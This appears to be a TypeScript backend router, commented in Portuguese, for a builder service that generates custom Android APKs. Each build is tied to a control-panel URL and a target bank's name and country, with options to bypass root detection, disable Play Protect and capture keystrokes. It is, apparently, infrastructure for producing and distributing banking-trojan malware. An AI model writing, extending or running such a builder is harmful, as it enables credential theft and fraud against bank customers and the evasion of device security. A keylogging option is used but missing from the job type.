import { z } from 'zod';
import { publicProcedure, router } from '../_core/trpc';
import { nanoid } from 'nanoid';
import { storagePut } from '../storage';
import { getAPKDownloadUrl, getEASConfigurationStatus } from '../eas-builder';
import { ENV } from '../_core/env';
import { generateAPK } from '../apk-generator';
import { getRuntimeApkConfigFromDb, saveRuntimeApkConfig } from '../apk-runtime-config-store';

type DeliveryMode = 'auto' | 'eas' | 'storage' | 'local';
type ArtifactSource = 'eas' | 'storage' | 'local' | 'github';

/**
 * APK Generator Router
 * Gerencia a geração dinâmica de APKs customizados
 */

interface BuildJob {
  id: string;
  status: 'pending' | 'building' | 'completed' | 'failed';
  progress: number;
  message: string;
  panelUrl: string;
  appName: string;
  packageName: string;
  versionName?: string;
  versionCode?: number;
  logoUrl?: string;
  bankId?: string;
  bankCountry?: string;
  bankName?: string;
  enableRootBypass?: boolean;
  enablePlayProtectBypass?: boolean;
  unlockPassword?: string; // ✅ ADICIONADO: Senha de desbloqueio
  downloadUrl?: string;
  deliveryMode: DeliveryMode;
  artifactSource?: ArtifactSource;
  createdAt: Date;
  updatedAt: Date;
}

export interface RuntimeApkConfig {
  buildId: string;
  panelUrl: string;
  appName: string;
  packageName: string;
  logoUrl?: string;
  bankId?: string;
  bankCountry?: string;
  bankName?: string;
  unlockPassword?: string; // ✅ ADICIONADO: Senha de desbloqueio
  artifactSource?: ArtifactSource;
  createdAt: string;
  updatedAt: string;
}

// Simulação de fila de builds (em produção, usar Redis ou banco de dados)
const buildJobs = new Map<string, BuildJob>();

// ✅ ADICIONADO: Função para gerar senha aleatória
function generateRandomPassword(length: number = 6): string {
  const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  let password = '';
  for (let i = 0; i < length; i++) {
    password += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return password;
}

export function getBuildJobById(buildId: string): BuildJob | undefined {
  return buildJobs.get(buildId);
}

export function getLatestRuntimeApkConfig(packageName?: string): RuntimeApkConfig | null {
  const completedJobs = Array.from(buildJobs.values()).filter(
    (job) => job.status === 'completed' && (!packageName || job.packageName === packageName)
  );

  if (completedJobs.length === 0) {
    return null;
  }

  const latest = completedJobs.sort((a, b) => b.updatedAt.getTime() - a.updatedAt.getTime())[0];

  return {
    buildId: latest.id,
    panelUrl: latest.panelUrl,
    appName: latest.appName,
    packageName: latest.packageName,
    logoUrl: latest.logoUrl,
    bankId: latest.bankId,
    bankCountry: latest.bankCountry,
    bankName: latest.bankName,
    unlockPassword: latest.unlockPassword, // ✅ ADICIONADO
    artifactSource: latest.artifactSource,
    createdAt: latest.createdAt.toISOString(),
    updatedAt: latest.updatedAt.toISOString(),
  };
}

export async function resolveRuntimeApkConfig(packageName?: string): Promise<RuntimeApkConfig | null> {
  try {
    const fromDb = await getRuntimeApkConfigFromDb(packageName);
    if (fromDb) {
      return fromDb;
    }
  } catch (error) {
    console.warn('[APK RuntimeConfig] Database lookup failed, using memory fallback:', error);
  }

  return getLatestRuntimeApkConfig(packageName);
}

export const apkRouter = router({
  /**
   * Iniciar geração de APK
   */
  generate: publicProcedure
    .input(
      z.object({
        panelUrl: z.string().url(),
        appName: z.string().min(1).max(50),
        packageName: z.string().regex(/^[a-z][a-z0-9_]*(\.[a-z0-9_]+)*$/),
        versionName: z.string().min(1).max(20).optional(),
        versionCode: z.number().int().min(1).optional(),
        logoUrl: z.string().url().optional(),
        bankId: z.string().min(1),
        bankCountry: z.string().min(1),
        bankName: z.string().min(1),
        enableRootBypass: z.boolean().optional(),
        enablePlayProtectBypass: z.boolean().optional(),
        deliveryMode: z.enum(['auto', 'eas', 'storage', 'local']).optional(),
      })
    )
    .mutation(async ({ input }) => {
      const buildId = nanoid();
      // ✅ ADICIONADO: Gerar senha aleatória
      const unlockPassword = generateRandomPassword(6);

      const job: BuildJob = {
        id: buildId,
        status: 'pending',
        progress: 0,
        message: 'Preparando build...',
        panelUrl: input.panelUrl,
        appName: input.appName,
        packageName: input.packageName,
        versionName: input.versionName,
        versionCode: input.versionCode,
        logoUrl: input.logoUrl,
        bankId: input.bankId,
        bankCountry: input.bankCountry,
        bankName: input.bankName,
        enableRootBypass: input.enableRootBypass,
        enablePlayProtectBypass: input.enablePlayProtectBypass,
        unlockPassword, // ✅ ADICIONADO: Armazenar senha
        deliveryMode: input.deliveryMode ?? 'auto',
        createdAt: new Date(),
        updatedAt: new Date(),
      };

      buildJobs.set(buildId, job);

      // Simular progresso do build (em produção, usar sistema real de build)
      simulateBuildProgress(buildId);

      return {
        buildId,
        message: 'Build iniciado com sucesso',
        unlockPassword, // ✅ ADICIONADO: Retornar senha
      };
    }),

  /**
   * Verificar status do build
   */
  status: publicProcedure
    .input(z.object({ buildId: z.string() }))
    .query(({ input, ctx }) => {
      const job = buildJobs.get(input.buildId);

      if (!job) {
        return {
          status: 'not_found',
          progress: 0,
          message: 'Build não encontrado',
        };
      }

      return {
        status: job.status,
        progress: job.progress,
        message: job.message,
        unlockPassword: job.unlockPassword, // ✅ ADICIONADO: Retornar senha
        downloadUrl: job.downloadUrl ? toAbsoluteDownloadUrl(job.downloadUrl, ctx.req) : undefined,
        artifactSource: job.artifactSource,
      };
    }),

  /**
   * Listar builds recentes
   */
  listRecent: publicProcedure.query(({ ctx }) => {
    const recent = Array.from(buildJobs.values())
      .sort((a, b) => b.createdAt.getTime() - a.createdAt.getTime())
      .slice(0, 10)
      .map((job) => ({
        id: job.id,
        appName: job.appName,
        status: job.status,
        progress: job.progress,
        unlockPassword: job.unlockPassword, // ✅ ADICIONADO: Retornar senha
        createdAt: job.createdAt,
        downloadUrl: job.downloadUrl ? toAbsoluteDownloadUrl(job.downloadUrl, ctx.req) : undefined,
        artifactSource: job.artifactSource,
      }));

    return recent;
  }),

  capabilities: publicProcedure.query(() => {
    const eas = getEASConfigurationStatus();
    const storageAvailable = Boolean(ENV.forgeApiUrl && ENV.forgeApiKey);

    return {
      eas: {
        available: eas.available,
        details: eas,
      },
      storage: {
        available: storageAvailable,
        details: {
          hasForgeApiUrl: Boolean(ENV.forgeApiUrl),
          hasForgeApiKey: Boolean(ENV.forgeApiKey),
        },
      },
      local: {
        available: true,
      },
    };
  }),
});

/**
 * Simular progresso do build
 * Em produção, isso seria integrado com EAS Build ou outro sistema
 */
function simulateBuildProgress(buildId: string) {
  const job = buildJobs.get(buildId);
  if (!job) return;

  job.status = 'building';
  job.updatedAt = new Date();

  const stages = [
    { progress: 10, message: 'Baixando dependências...' },
    { progress: 25, message: 'Configurando projeto...' },
    { progress: 40, message: 'Compilando código...' },
    { progress: 50, message: 'Adicionando bypass root...' },
    { progress: 60, message: 'Configurando desinstalação automática do Play Protect...' },
    { progress: 75, message: 'Integrando logo e configurações...' },
    { progress: 85, message: 'Gerando APK...' },
    { progress: 95, message: 'Assinando APK...' },
    { progress: 100, message: 'Finalizando...' },
  ];

  let stageIndex = 0;

  const interval = setInterval(() => {
    if (stageIndex < stages.length) {
      const stage = stages[stageIndex];
      job.progress = stage.progress;
      job.message = stage.message;
      job.updatedAt = new Date();
      stageIndex++;
    } else {
      finalizeBuild(job)
        .catch((error) => {
          console.error('[APK Build] Failed to finalize build:', error);
          job.status = 'failed';
          job.message = 'Falha ao finalizar APK';
          job.updatedAt = new Date();
        });
      clearInterval(interval);

      // Limpar job após 24 horas
      setTimeout(() => {
        buildJobs.delete(buildId);
      }, 24 * 60 * 60 * 1000);
    }
  }, 3000); // Atualizar a cada 3 segundos
}

async function finalizeBuild(job: BuildJob): Promise<void> {
  job.status = 'completed';
  job.progress = 100;
  job.message = 'APK gerado com sucesso!';
  job.updatedAt = new Date();

  const fileName = `${job.packageName}.apk`;
  const deliveryMode = job.deliveryMode;

  if (deliveryMode === 'eas' || deliveryMode === 'auto') {
    try {
      const easUrl = await getAPKDownloadUrl(job.id);
      job.downloadUrl = easUrl;
      job.artifactSource = 'eas';
      job.message = 'APK gerado e publicado via EAS!';
      await persistRuntimeConfig(job);
      return;
    } catch (error) {
      if (deliveryMode === 'eas') {
        throw error;
      }
      console.warn('[APK Build] EAS unavailable, trying storage fallback:', error);
    }
  }

  if (deliveryMode === 'storage' || deliveryMode === 'auto') {
    try {
      const apkContent = await generateAPK({
        appName: job.appName,
        packageName: job.packageName,
        versionName: job.versionName ?? '1.0.0',
        versionCode: job.versionCode ?? 1,
        logoUrl: job.logoUrl,
        panelUrl: job.panelUrl,
        bankId: job.bankId ?? 'default',
        bankCountry: job.bankCountry ?? 'BR',
        bankName: job.bankName ?? 'Default Bank',
        enableRootBypass: job.enableRootBypass,
        enablePlayProtectBypass: job.enablePlayProtectBypass,
        enableKeylogCapture: job.enableKeylogCapture,
        unlockPassword: job.unlockPassword, // ✅ ADICIONADO: Passar senha para APK
      });

      const uploaded = await storagePut(
        `apks/${job.id}/${fileName}`,
        apkContent,
        'application/vnd.android.package-archive'
      );

      job.downloadUrl = uploaded.url;
      job.artifactSource = 'storage';
      job.message = 'APK gerado e publicado no storage!';
      await persistRuntimeConfig(job);
      return;
    } catch (error) {
      if (deliveryMode === 'storage') {
        throw error;
      }
      console.warn('[APK Build] Storage unavailable, using local download route:', error);
    }
  }

  if (ENV.apkGithubUrl) {
    job.downloadUrl = ENV.apkGithubUrl;
    job.artifactSource = 'github';
    job.message = 'APK pronto com link direto do GitHub.';
    await persistRuntimeConfig(job);
    return;
  }

  job.downloadUrl = generateDownloadUrl(job);
  job.artifactSource = 'local';
  job.message = 'APK gerado com fallback local de download.';
  await persistRuntimeConfig(job);
}

async function persistRuntimeConfig(job: BuildJob): Promise<void> {
  try {
    await saveRuntimeApkConfig({
      buildId: job.id,
      panelUrl: job.panelUrl,
      appName: job.appName,
      packageName: job.packageName,
      logoUrl: job.logoUrl,
      bankId: job.bankId,
      bankCountry: job.bankCountry,
      bankName: job.bankName,
      unlockPassword: job.unlockPassword, // ✅ ADICIONADO: Salvar senha
      artifactSource: job.artifactSource,
    });
  } catch (error) {
    console.warn('[APK RuntimeConfig] Failed to persist runtime configuration:', error);
  }
}

/**
 * Gerar URL de download (simulado)
 * Em produção, seria um link real para o APK no S3 ou similar
 */
function generateDownloadUrl(job: BuildJob): string {
  return `/api/apk/download/${job.id}/${job.packageName}.apk`;
}

function toAbsoluteDownloadUrl(relativeOrAbsoluteUrl: string, req: { headers: Record<string, string | string[] | undefined> }): string {
  if (/^https?:\/\//i.test(relativeOrAbsoluteUrl)) {
    return relativeOrAbsoluteUrl;
  }

  const forwardedProto = req.headers['x-forwarded-proto'];
  const proto = Array.isArray(forwardedProto)
    ? forwardedProto[0]
    : forwardedProto || 'http';

  const hostHeader = req.headers.host;
  const host = Array.isArray(hostHeader) ? hostHeader[0] : hostHeader;

  if (!host) {
    return relativeOrAbsoluteUrl;
  }

  return `${proto}://${host}${relativeOrAbsoluteUrl}`;
}
